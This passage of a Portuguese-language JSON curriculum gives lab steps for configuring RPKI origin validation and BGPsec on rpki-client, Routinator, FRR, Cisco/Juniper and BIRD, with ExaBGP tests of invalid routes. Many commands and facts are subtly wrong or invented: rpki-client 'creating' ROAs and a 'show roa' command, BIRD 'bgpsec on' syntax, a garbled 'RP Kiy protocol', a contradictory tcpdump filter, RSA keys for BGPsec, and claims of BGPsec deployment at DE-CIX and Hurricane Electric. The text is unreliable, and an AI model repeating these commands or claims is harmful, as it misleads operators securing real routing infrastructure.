                                  "learningObjective": "Configurar um validador RPKI local para sincronizar e validar repositórios de confiança globais.",
                                  "commonMistakes": [
                                    "Não abrir porta TCP/873 no firewall para rsync",
                                    "Esquecer de inicializar o repositório antes do primeiro update",
                                    "Ignorar warnings de certificados durante sync inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar rpki-client e Criar um ROA de Teste",
                                  "subSteps": [
                                    "Instale dependências: sudo apt install git build-essential libssl-dev libevent-dev bison flex -y.",
                                    "Clone e compile rpki-client: git clone https://github.com/rpki-client/rpki-client-port, cd rpki-client-port, make && sudo make install.",
                                    "Crie /etc/rpki/rpki.conf com seção roa: '192.0.2.0/24 -> 64496 maxlen 24' (exemplo para AS64496).",
                                    "Execute rpki-client em modo daemon: sudo rpki-client -d /var/db/rpki -f /etc/rpki/rpki.conf.",
                                    "Verifique: rpki-client show roa para listar o ROA gerado."
                                  ],
                                  "verification": "'rpki-client show roa' lista o ROA com ASN 64496 e prefixo 192.0.2.0/24 como válido.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Mesma VM do Step 1",
                                    "rpki-client source code",
                                    "Editor de texto como vim/nano"
                                  ],
                                  "tips": "Para testes locais, configure um TAL (Trust Anchor Locator) apontando para seu próprio repo para validação interna.",
                                  "learningObjective": "Gerar e gerenciar ROAs usando rpki-client para autorizar origens de rotas específicas.",
                                  "commonMistakes": [
                                    "Sintaxe incorreta no rpki.conf (use -> para mapeamento)",
                                    "Executar sem diretório de DB inicializado",
                                    "Não especificar maxlen corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar FRRouting (FRR) com Integração RPKI",
                                  "subSteps": [
                                    "Instale FRR: sudo apt install frr frr-rpki-rtrlib -y.",
                                    "Edite /etc/frr/daemons: habilite bgpd=yes e zebra=yes.",
                                    "Configure Routinator para poll socket: adicione 'mode socket' em /etc/routinator/routinator.conf.",
                                    "Em /etc/frr/frr.conf (ou vtysh): configure 'rpki socket /run/routinator/rtr.socket', neighbor BGP, e route-map reject invalid.",
                                    "Reinicie: sudo systemctl restart frr && sudo routinator vrps --socket /run/routinator/rtr.socket."
                                  ],
                                  "verification": "Em vtysh: 'show rpki summary' mostra conexão ativa com Routinator e VRPs recebidos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "FRR pacotes",
                                    "Configurações de exemplo de FRR",
                                    "vtysh tool"
                                  ],
                                  "tips": "Use 'integrated-config from frr.conf' para simplificar configuração em um arquivo.",
                                  "learningObjective": "Integrar validação RPKI em um BGP speaker para aplicar políticas baseadas em ROAs.",
                                  "commonMistakes": [
                                    "Caminho incorreto do socket RTR",
                                    "Não habilitar rpki no daemons file",
                                    "Route-map sem match rpki invalid"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Validação de Anúncios BGP contra RPKI",
                                  "subSteps": [
                                    "Instale ExaBGP para simular peers: pip install exabgp.",
                                    "Crie config ExaBGP para anunciar rota válida: announce route 192.0.2.0/24 next-hop 127.0.0.1 community [64496:1].",
                                    "Execute ExaBGP e verifique aceitação em FRR logs.",
                                    "Anuncie rota inválida: 192.0.2.0/24 com AS diferente (ex: 65001), confira rejeição.",
                                    "Cheque status: vtysh 'show bgp summary' e 'show rpki cache'."
                                  ],
                                  "verification": "Logs do FRR mostram 'RPKI INVALID' para rota inválida e 'VALID' para válida; nenhuma rota inválida na RIB.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "ExaBGP instalado",
                                    "Duas terminais para BGP sessions",
                                    "FRR vtysh"
                                  ],
                                  "tips": "Use loopback interfaces para simular peers internos sem rede externa.",
                                  "learningObjective": "Validar e rejeitar anúncios BGP inválidos baseados em ROAs para reforçar segurança de roteamento.",
                                  "commonMistakes": [
                                    "Não configurar local-address no neighbor BGP",
                                    "Esquecer de soft-reconfig para peers",
                                    "Confundir estados NOTFOUND com INVALID"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com VM Ubuntu, crie um ROA autorizando AS64496 para 192.0.2.0/24 maxlen 24 usando rpki-client. Configure FRR para peering com ExaBGP simulando um upstream. Anuncie a rota válida (aceita) e inválida (AS65001 rejeitada com log 'BGP: rx INVALID from RPKI').",
                              "finalVerifications": [
                                "Routinator sincronizado e monitor sem erros.",
                                "ROA listado e válido em rpki-client show roa.",
                                "FRR rpki socket conectado e VRPs populados.",
                                "Rota BGP válida aceita na tabela de roteamento.",
                                "Rota BGP inválida rejeitada nos logs com motivo RPKI.",
                                "Relatórios Routinator VRPs coincidem com ROA criado."
                              ],
                              "assessmentCriteria": [
                                "Todas configurações executadas sem erros de sintaxe ou falhas de serviço.",
                                "Validação RPKI rejeita 100% das rotas inválidas em testes repetidos.",
                                "Explicação correta dos logs e estados (VALID/INVALID/NOTFOUND).",
                                "Tempo total dentro de 3.5 horas com setup limpo.",
                                "Identificação e correção de pelo menos um erro comum simulado.",
                                "Geração de relatório de VRPs via Routinator CLI."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: PKI, assinaturas digitais e cadeias de confiança.",
                                "Redes: Protocolo BGP, políticas de route-map e RIB/FIB.",
                                "Sistemas Operacionais: Administração Linux, systemd e sockets Unix.",
                                "Segurança: Análise de logs, autenticação de roteamento e mitigação de hijacks.",
                                "Programação: Configurações em YAML/INI e automação com scripts."
                              ],
                              "realWorldApplication": "Provedores de internet (ISPs) configuram ROAs em CAs RPKI para autorizar prefixos IP por AS, permitindo validação em roteadores BGP para rejeitar anúncios falsos, prevenindo hijacks como o sequestro de rotas da Fastly/Amazon em 2021 que redirecionou tráfego global."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.3.1.2.3",
                            "name": "Aplicar RPKI em roteadores",
                            "description": "Integrar validação RPKI em roteadores Cisco ou Juniper via comandos BGP (ex: 'bgp bestpath prefix-validate'), testando filtragem de rotas inválidas em laboratório.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de laboratório com RPKI Validator",
                                  "subSteps": [
                                    "Instale um RPKI validator como o RIPEstat ou OctoRPKI em uma VM ou use um serviço público como NPR-PDP.",
                                    "Configure o roteador Cisco/Juniper para alcançar o validator via IPv4/IPv6 (ex: ping ao endpoint).",
                                    "Gere ou obtenha ROAs (Route Origin Authorizations) de teste de repositórios públicos como o da LACNIC ou ARIN.",
                                    "Configure BGP peers básicos entre dois roteadores simulando ASNs diferentes.",
                                    "Verifique conectividade básica com 'show bgp summary' ou equivalente em Juniper."
                                  ],
                                  "verification": "Execite 'show rpki cache-server' (Cisco) ou 'show rpki cache' (Juniper) e confirme conexão ativa com o validator.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Roteadores Cisco IOS-XR/Juniper JunOS em GNS3/EVE-NG",
                                    "VM com RPKI validator",
                                    "Documentação RFC 6811"
                                  ],
                                  "tips": "Use loopback interfaces para estabilidade; inicie com IPv4 para simplicidade.",
                                  "learningObjective": "Entender e configurar o acesso ao RPKI cache para validação de prefixos.",
                                  "commonMistakes": [
                                    "Firewall bloqueando porta 323 (RP Kiy protocol)",
                                    "Endereço IP incorreto do validator",
                                    "Falta de ROAs de teste disponíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar consulta RPKI no roteador",
                                  "subSteps": [
                                    "No Cisco: 'rpki server <IP> port 323 source-interface Loopback0' e 'rpki cache <nome>'.",
                                    "No Juniper: 'set protocols rpki group rpki-group rpki-server <IP> port 323'.",
                                    "Aguarde sincronização de cache (use 'clear rpki cache' se necessário).",
                                    "Verifique ROAs carregadas com 'show rpki cache rp <prefixo>'.",
                                    "Teste validação manual de um prefixo conhecido válido/inválido."
                                  ],
                                  "verification": "Comando 'show rpki cache summary' mostra ROAs válidas, inválidas e not-found.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "CLI do roteador",
                                    "Lista de prefixos de teste com ROAs conhecidas"
                                  ],
                                  "tips": "Monitore logs com 'debug rpki' para troubleshooting de sincronização.",
                                  "learningObjective": "Implementar comunicação segura roteador-validator usando RP Kiy protocol.",
                                  "commonMistakes": [
                                    "Porta errada (não 323)",
                                    "Source-interface não roteável",
                                    "Cache não limpo após mudanças"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Habilitar validação de prefixos BGP com RPKI",
                                  "subSteps": [
                                    "No Cisco: 'router bgp <ASN> address-family ipv4 unicast bgp bestpath prefix-validate allow-invalid'.",
                                    "No Juniper: 'set protocols bgp group <group> family inet unicast prefix-validate'.",
                                    "Configure políticas de roteamento para aceitar/rejeitar baseadas em validade (válido/preferencial, inválido/rejeitar).",
                                    "Aplique em neighbors: 'neighbor <IP> rpki validation'.",
                                    "Salve configuração e reinicie BGP session se necessário."
                                  ],
                                  "verification": "'show bgp 0.0.0.0 rpki' exibe status de validação por rota.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Documentação Cisco IOS-XR BGP RPKI",
                                    "Juniper JunOS RPKI guide"
                                  ],
                                  "tips": "Comece com 'allow-invalid' para observar antes de rejeitar.",
                                  "learningObjective": "Integrar RPKI na seleção bestpath BGP conforme RFC 6811.",
                                  "commonMistakes": [
                                    "Falta de address-family",
                                    "Política não aplicada a neighbors",
                                    "ASN mismatch em ROAs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar filtragem de rotas inválidas",
                                  "subSteps": [
                                    "No roteador peer, anuncie prefixos válidos, inválidos e not-found usando ROAs de teste.",
                                    "Use ferramentas como ExaBGP ou bgpcli para injetar rotas inválidas.",
                                    "Monitore tabela BGP com 'show bgp ipv4 unicast <prefixo>' e filtre por rpki-state.",
                                    "Verifique que rotas inválidas são marcadas/rejeitadas e não selecionadas como bestpath.",
                                    "Teste falha do validator: desconecte e observe fallback para 'not-found'."
                                  ],
                                  "verification": "Rotas inválidas ausentes da RIB/FIB; 'show bgp summary' sem invalids.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Script ExaBGP para anúncios",
                                    "Prefixos de teste: ex. 192.0.2.0/24 válido, 203.0.113.0/24 inválido"
                                  ],
                                  "tips": "Capture debugs BGP e RPKI para análise.",
                                  "learningObjective": "Validar eficácia da filtragem RPKI contra prefix hijacking.",
                                  "commonMistakes": [
                                    "Anúncios sem withdraw",
                                    "Peer não configurado para RPKI",
                                    "Timeout em validação"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e otimizar a configuração",
                                  "subSteps": [
                                    "Execute auditoria completa: 'show rpki statistics' e 'show bgp rpki conflicts'.",
                                    "Configure alertas Syslog para invalids e monitore com SNMP.",
                                    "Teste cenários de falha: validator down, ROA expirado.",
                                    "Documente configuração e crie playbook de troubleshooting.",
                                    "Otimize com max-cache-size se necessário."
                                  ],
                                  "verification": "Relatório final sem conflitos; simulação de produção passa em todos testes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas de monitoramento como PRTG",
                                    "Template de config RPKI"
                                  ],
                                  "tips": "Automatize testes com Ansible para repetibilidade.",
                                  "learningObjective": "Garantir robustez e monitoramento contínuo da validação RPKI.",
                                  "commonMistakes": [
                                    "Ignorar not-found como inválidos",
                                    "Sem logging",
                                    "Config não salva"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab GNS3 com dois roteadores Cisco AS65001 e AS65002: Configure RPKI cache para NPR-PDP. Anuncie 203.0.113.0/24 (inválido sem ROA) do AS65002. No AS65001, após 'bgp bestpath prefix-validate', a rota é marcada inválida e rejeitada, prevenindo propagação.",
                              "finalVerifications": [
                                "RPKI cache sincronizado com >1000 ROAs.",
                                "'show bgp rpki' lista rotas com estados valid/not-found/invalid corretos.",
                                "Rotas inválidas filtradas da bestpath e não forwarding.",
                                "Falha graceful no validator: rotas viram not-found sem crash BGP.",
                                "Logs registram todos eventos de validação.",
                                "Teste end-to-end: ping falha para prefix inválido anunciado."
                              ],
                              "assessmentCriteria": [
                                "Configuração RPKI 100% conforme RFC 6811 sem erros de sintaxe.",
                                "Filtragem correta: 100% rotas inválidas rejeitadas.",
                                "Tempo de convergência BGP <30s após mudanças.",
                                "Documentação completa com comandos e saídas.",
                                "Resolução de 3+ cenários de erro simulados.",
                                "Integração com políticas BGP existentes sem regressão."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entendimento de PKI, certificados X.509 e assinaturas digitais em ROAs.",
                                "Redes: Protocolos BGP avançados e atributos path (RFC 8097).",
                                "Segurança Cibernética: Mitigação de BGP hijacking e route leaks.",
                                "Programação: Automação com Python/Netmiko para configs RPKI.",
                                "Gestão de Infra: Monitoramento e alta disponibilidade de validators."
                              ],
                              "realWorldApplication": "Em provedores de internet (ISPs), RPKI previne BGP hijacks como o do YouTube 2008 (Pakistan Telecom), filtrando anúncios inválidos em tempo real, protegendo tráfego global e mantendo integridade da tabela de roteamento da internet."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.1.3",
                        "name": "BGPsec",
                        "description": "Extensão do BGP para autenticação criptográfica de caminhos de roteamento, garantindo integridade e autenticidade de AS_PATH através de assinaturas cumulativas.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.3.1",
                            "name": "Entender o protocolo BGPsec",
                            "description": "Descrever o mecanismo de BGPsec, incluindo chaves assimétricas por AS, campos SEC_PATH e verificação de assinaturas em cada hop do caminho BGP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos do BGP e as Ameaças de Segurança",
                                  "subSteps": [
                                    "Estude o funcionamento básico do BGP: trocas de mensagens UPDATE para anúncios de prefixos IP.",
                                    "Identifique vulnerabilidades principais: hijacking de prefixos, injeção de rotas falsas e impersonation de AS.",
                                    "Revise exemplos reais de ataques BGP, como o hijacking do YouTube em 2008.",
                                    "Compare BGP padrão com extensões de segurança como BGPsec.",
                                    "Anote as limitações do BGP tradicional em termos de autenticação de caminho."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando um ataque BGP hijacking e explique como BGPsec mitiga.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 4271 (BGP-4)",
                                    "Artigo: 'BGP Hijacking Explained'",
                                    "Vídeo introdutório sobre BGP no YouTube (Cisco Networking Academy)"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo de anúncios BGP; foque em AS_PATH vs. caminho seguro.",
                                  "learningObjective": "Compreender por que BGPsec é necessário e suas motivações principais.",
                                  "commonMistakes": [
                                    "Confundir BGP com protocolos internos de roteamento como OSPF.",
                                    "Ignorar que BGP é exterior e confia em peers sem autenticação nativa."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender sobre Chaves Assimétricas por AS no BGPsec",
                                  "subSteps": [
                                    "Estude a PKI (Public Key Infrastructure) usada em BGPsec: cada AS gera um par de chaves pública/privada.",
                                    "Entenda o registro de chaves públicas via Resource Public Key Infrastructure (RPKI).",
                                    "Descreva como a chave privada é usada para assinar anúncios e a pública para verificação.",
                                    "Analise o ciclo de vida das chaves: geração, distribuição e rotação.",
                                    "Diferencie chaves por AS de chaves globais ou por prefixo."
                                  ],
                                  "verification": "Liste os passos para gerar e registrar um par de chaves para um AS simulado.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 8205 (BGPsec Protocol Specification)",
                                    "Documentação RPKI (man-rfc6490)",
                                    "Ferramenta OpenSSL para gerar chaves assimétricas"
                                  ],
                                  "tips": "Pratique gerando chaves com OpenSSL: openssl genrsa -out private.pem 2048.",
                                  "learningObjective": "Dominar o uso de criptografia assimétrica específica por AS em BGPsec.",
                                  "commonMistakes": [
                                    "Confundir chaves assimétricas de BGPsec com certificados SSL/TLS.",
                                    "Esquecer que chaves são por AS, não por roteador individual."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar a Estrutura do Campo SEC_PATH",
                                  "subSteps": [
                                    "Descreva o atributo BGPsec_PATH: sequência de entradas SEC_SEGMENT para cada AS no caminho.",
                                    "Detalhe campos de cada entrada: Flags, Timestamp, AS Number, Signature Block (assinatura).",
                                    "Entenda como o SEC_PATH é propagado: cada AS prepende sua entrada ao atributo.",
                                    "Analise o tamanho e overhead: impacto no MTU e processamento.",
                                    "Compare SEC_PATH com AS_PATH tradicional."
                                  ],
                                  "verification": "Desenhe a estrutura de um SEC_PATH para um caminho de 4 ASes, rotulando cada campo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 8205 Seção 6 (BGPsec_PATH Attribute)",
                                    "Exemplos de pacotes BGPsec em Wireshark",
                                    "Diagrama oficial do IETF BGPsec"
                                  ],
                                  "tips": "Use Wireshark com filtro 'bgpsec' para capturar e inspecionar exemplos reais.",
                                  "learningObjective": "Mapear precisamente a estrutura e propagação do SEC_PATH.",
                                  "commonMistakes": [
                                    "Invertir a ordem das entradas (SEC_PATH é prepend, não append).",
                                    "Omitir campos obrigatórios como Timestamp."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Dominar o Processo de Verificação de Assinaturas em Cada Hop",
                                  "subSteps": [
                                    "Descreva a verificação receptora: validar assinaturas sequencialmente do destino à origem.",
                                    "Explique recursão: usar chave pública do AS anterior para validar assinatura atual.",
                                    "Entenda falhas: rejeitar se qualquer assinatura falhar ou chaves não corresponderem.",
                                    "Analise cenários: verificação parcial vs. completa, e impacto de chaves revogadas.",
                                    "Simule o processo em pseudocódigo ou ferramenta."
                                  ],
                                  "verification": "Escreva um fluxograma do algoritmo de verificação para um UPDATE BGPsec.",
                                  "estimatedTime": "1 hora 15 minutos",
                                  "materials": [
                                    "RFC 8205 Seção 7 (BGPsec Validation Procedures)",
                                    "Implementação de referência: bgpsec-tools no GitHub",
                                    "Simulador BGP como ExaBGP ou BIRD"
                                  ],
                                  "tips": "Implemente uma verificação simples em Python usando bibliotecas crypto para praticar.",
                                  "learningObjective": "Executar mentalmente o processo de verificação hop-by-hop.",
                                  "commonMistakes": [
                                    "Verificar assinaturas fora de ordem (deve ser sequencial).",
                                    "Ignorar validação de Timestamp para replay attacks."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar BGPsec: Benefícios, Limitações e Integração",
                                  "subSteps": [
                                    "Resuma benefícios: autenticação de caminho, prevenção de hijacking.",
                                    "Discuta limitações: overhead computacional, adoção lenta, dependência de RPKI.",
                                    "Explore integração com RPKI e Origin Validation.",
                                    "Analise casos de uso reais e métricas de deployment.",
                                    "Planeje uma implementação em lab: configure BGPsec em roteadores simulados."
                                  ],
                                  "verification": "Redija um relatório de 1 página comparando BGPsec com BGP sem segurança.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 8207 (BGPsec Baseline Capabilities)",
                                    "Relatório CAIDA sobre adoção BGPsec",
                                    "Labs GNS3 ou EVE-NG com BGPsec support"
                                  ],
                                  "tips": "Monitore deployment real via Hurricane Electric BGP Toolkit.",
                                  "learningObjective": "Avaliar BGPsec holisticamente no ecossistema de segurança BGP.",
                                  "commonMistakes": [
                                    "Superestimar adoção (ainda baixa em 2023).",
                                    "Confundir BGPsec com BGP FlowSpec ou outras extensões."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com 3 ASes roteados via BIRD software: AS1 anuncia prefixo 10.0.0.0/24 com BGPsec, assina com chave privada; AS2 e AS3 verificam SEC_PATH sequencialmente usando chaves públicas RPKI; simule falha removendo uma assinatura e observe rejeição do anúncio.",
                              "finalVerifications": [
                                "Explique verbalmente o fluxo completo de assinatura e verificação para um caminho de 5 ASes.",
                                "Desenhe e label um SEC_PATH válido com 4 entradas.",
                                "Identifique e corrija um SEC_PATH malformado em um exemplo dado.",
                                "Simule verificação em código Python e valide contra RFC.",
                                "Compare BGPsec com alternativas como RPKI-only em um quadro.",
                                "Configure BGPsec básico em um simulador e capture tráfego com Wireshark."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de chaves assimétricas e seu papel por AS (90%+ acurácia).",
                                "Compreensão completa da estrutura SEC_PATH, incluindo todos os campos obrigatórios.",
                                "Domínio do algoritmo de verificação sequencial sem erros lógicos.",
                                "Capacidade de identificar limitações e cenários de falha realistas.",
                                "Integração de conceitos em exemplos práticos e diagramas claros.",
                                "Uso correto de terminologia RFC (ex: SEC_SEGMENT, prepend)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: PKI, assinaturas digitais e validação de cadeia (PKIX).",
                                "Redes: Protocolos de roteamento exterior e análise de tráfego (Wireshark).",
                                "Cibersegurança: Detecção de ataques de roteamento e autenticação de origem.",
                                "Matemática: Criptografia assimétrica e hashes.",
                                "Gestão de TI: Políticas de rotação de chaves e conformidade RPKI."
                              ],
                              "realWorldApplication": "BGPsec é usado por grandes ISPs e IXPs (ex: DE-CIX, Hurricane Electric) para proteger anúncios de prefixos contra hijacking, garantindo que rotas para serviços críticos como Google ou bancos sigam caminhos autênticos, prevenindo interrupções globais como o hijacking da Ucrânia em 2017."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.3.1.3.2",
                            "name": "Implementar autenticação BGPsec",
                            "description": "Configurar BGPsec em ambientes de teste com OpenBGPd ou BIRD, gerando certificados e propagando mensagens seguras, validando proteção contra manipulações de caminho.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste e gerar certificados BGPsec",
                                  "subSteps": [
                                    "Instale o software BIRD em máquinas virtuais representando roteadores (ex: Ubuntu VMs em VirtualBox ou GNS3).",
                                    "Configure uma topologia simples de rede com pelo menos 3 roteadores conectados via interfaces virtuais (ex: AS1, AS2, AS3).",
                                    "Baixe e instale as ferramentas RPKI e Resource Public Key Infrastructure para geração de certificados BGPsec.",
                                    "Gere chaves privadas e certificados de assinatura para cada AS usando o script bgpsec_keygen ou ferramentas OpenSSL adaptadas.",
                                    "Publique os certificados em um validador RPKI local para simular o ambiente de produção."
                                  ],
                                  "verification": "Verifique a geração de certificados listando arquivos .cer e .key gerados e validando com openssl x509 -in cert.cer -text -noout.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Máquinas virtuais com Ubuntu 22.04",
                                    "BIRD BGP daemon (versão 2.0+)",
                                    "Ferramentas RPKI (rpki-client)",
                                    "OpenSSL"
                                  ],
                                  "tips": "Use uma topologia em loopback para evitar conflitos de roteamento iniciais; teste conectividade básica com ping antes de prosseguir.",
                                  "learningObjective": "Entender o processo de geração e distribuição de certificados criptográficos para BGPsec.",
                                  "commonMistakes": [
                                    "Gerar certificados com ASNs incorretos",
                                    "Esquecer de ativar RPKI validator",
                                    "Usar chaves fracas (mínimo 2048 bits)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar BGPsec no daemon BIRD",
                                  "subSteps": [
                                    "Edite o arquivo de configuração /etc/bird.conf para ativar BGPsec com 'bgpsec on;' e especifique os caminhos para certificados.",
                                    "Defina vizinhos BGP com capacidades BGPsec habilitadas usando 'neighbor <IP> bgpsec yes;' e importe/exporte rotas com assinatura.",
                                    "Configure políticas de roteamento para propagar apenas rotas BGPsec-validas com 'filter { if (!bgpsec_valid) then reject; }'.",
                                    "Inclua os certificados gerados na seção 'bgpsec keys' e defina o intervalo de assinatura.",
                                    "Reinicie o BIRD com 'birdc configure' e verifique status com 'birdc show protocols'."
                                  ],
                                  "verification": "Use 'birdc show bgpsec status' para confirmar que BGPsec está ativo e certificados carregados sem erros.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Editor de texto (vim/nano)",
                                    "Documentação BIRD BGPsec",
                                    "birdc CLI tool"
                                  ],
                                  "tips": "Comece com configurações mínimas e adicione filtros gradualmente; habilite logging verbose para depuração.",
                                  "learningObjective": "Dominar a sintaxe e ativação de BGPsec em configurações BIRD.",
                                  "commonMistakes": [
                                    "Esquecer de especificar 'bgpsec on' globalmente",
                                    "Configurar vizinhos sem capacidade BGPsec",
                                    "Erros de path para certificados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Propagar mensagens BGP seguras e monitorar tráfego",
                                  "subSteps": [
                                    "Anuncie rotas prefixadas de cada AS (ex: 192.0.2.0/24 de AS1 para AS2 e AS3).",
                                    "Monitore a propagação com 'birdc show route bgpsec' para ver assinaturas anexadas aos UPDATEs.",
                                    "Simule tráfego de dados entre hosts nos AS para testar forwarding de pacotes roteados via caminhos BGPsec.",
                                    "Use tcpdump ou Wireshark para capturar pacotes BGP e inspecionar campos BGPsec_PATH.",
                                    "Registre logs de validação de assinatura em cada roteador."
                                  ],
                                  "verification": "Confirme que rotas chegam com status 'BGPSEC valid' em todos os roteadores receptores via birdc.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Wireshark ou tcpdump",
                                    "Hosts de teste em cada VM",
                                    "birdc show route"
                                  ],
                                  "tips": "Filtre tcpdump por porta BGP (179) com 'tcp port 179 and udp port 179' para foco em mensagens seguras.",
                                  "learningObjective": "Observar e validar a propagação de rotas autenticadas em uma rede multi-AS.",
                                  "commonMistakes": [
                                    "Anunciar rotas sem assinatura BGPsec",
                                    "Ignorar validação de timestamp em PATH",
                                    "Não sincronizar relógios NTP entre VMs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar proteção contra manipulações de caminho",
                                  "subSteps": [
                                    "Simule um ataque de hijacking alterando manualmente uma rota em um roteador intermediário (remova/injete assinatura falsa).",
                                    "Verifique rejeição da rota manipulada com 'birdc show route' mostrando status 'BGPSEC invalid'.",
                                    "Teste prepend de AS path e confirme detecção de manipulação via BGPsec_PATH segments.",
                                    "Execute validação RPKI completa com rpki-client e integre resultados ao BIRD.",
                                    "Documente métricas de performance (latência de validação, overhead de assinatura)."
                                  ],
                                  "verification": "Demonstre que rotas manipuladas são dropadas e tráfego é rerroteado apenas por caminhos válidos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Scripts de simulação de ataques (Python/Scapy)",
                                    "rpki-client validator"
                                  ],
                                  "tips": "Use GNS3 para topologias mais realistas; grave sessões tcpdump antes/depois do ataque para análise.",
                                  "learningObjective": "Compreender e demonstrar a resiliência de BGPsec contra ataques de roteamento.",
                                  "commonMistakes": [
                                    "Não isolar o ambiente de teste do mundo real",
                                    "Confundir invalidação BGPsec com RPKI ROA",
                                    "Subestimar overhead computacional"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma topologia de 3 roteadores virtuais (R1-AS65001, R2-AS65002, R3-AS65003), gere certificados para cada AS, configure BIRD com BGPsec, anuncie 203.0.113.0/24 de R1 para R3 via R2. Simule hijacking em R2 removendo assinatura; confirme que R3 rejeita a rota inválida e mantém conectividade apenas via caminhos autênticos.",
                              "finalVerifications": [
                                "Rotas BGPsec são propagadas com PATH signatures válidas em todos os peers.",
                                "Certificados são carregados sem erros e validados por RPKI local.",
                                "Ataques simulados resultam em rejeição automática de rotas manipuladas.",
                                "Logs BIRD mostram apenas 'valid' ou 'unknown' para BGPsec, sem 'invalid'.",
                                "Overhead de CPU/memória permanece abaixo de 20% durante propagação.",
                                "Wireshark captura confirma presença de BGPsec TLVs em UPDATEs."
                              ],
                              "assessmentCriteria": [
                                "Precisão na geração e configuração de certificados (100% válidos).",
                                "Configuração BIRD sem erros sintáticos e ativação completa de BGPsec.",
                                "Sucesso na detecção e mitigação de 100% dos ataques simulados.",
                                "Documentação clara de logs, capturas e métricas de teste.",
                                "Tempo de conclusão dentro do estimado total (6 horas).",
                                "Explicação correta de conceitos BGPsec em relatório final."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Geração e validação de certificados X.509 e assinaturas digitais.",
                                "Redes: Protocolos BGP tradicionais vs. extensões de segurança.",
                                "Sistemas Operacionais: Configuração de daemons e troubleshooting em Linux.",
                                "Segurança Aplicada: Integração com RPKI/ROA para defesa contra prefix hijacking."
                              ],
                              "realWorldApplication": "Implementar BGPsec em provedores de internet (ISPs) e data centers para prevenir BGP hijacking, como o incidente de 2021 com rotas da AWS sequestradas, garantindo integridade de caminhos de roteamento global e protegendo tráfego crítico de manipulações maliciosas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.2.1"
                            ]
                          },
                          {
                            "id": "10.1.3.1.3.3",
                            "name": "Comparar BGPsec e RPKI",
                            "description": "Analisar diferenças e complementaridades: RPKI valida origens, BGPsec valida caminhos completos, com casos de uso e limitações como overhead computacional.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do RPKI",
                                  "subSteps": [
                                    "Ler a RFC 6811 para entender Resource Public Key Infrastructure (RPKI)",
                                    "Identificar componentes principais: Trust Anchor, Certificates, ROAs (Route Origin Authorizations)",
                                    "Explicar como RPKI valida a origem de prefixos IP em anúncios BGP",
                                    "Simular validação de uma ROA usando ferramentas online como o Hurricane Electric BGP Toolkit",
                                    "Diferenciar validação de origem de validação de caminho"
                                  ],
                                  "verification": "Criar um diagrama explicando o fluxo de validação RPKI e validar uma rota real com uma ferramenta RPKI",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "RFC 6811",
                                    "Hurricane Electric BGP Toolkit (bgp.he.net)",
                                    "Documentação ARIN/RIPE sobre RPKI"
                                  ],
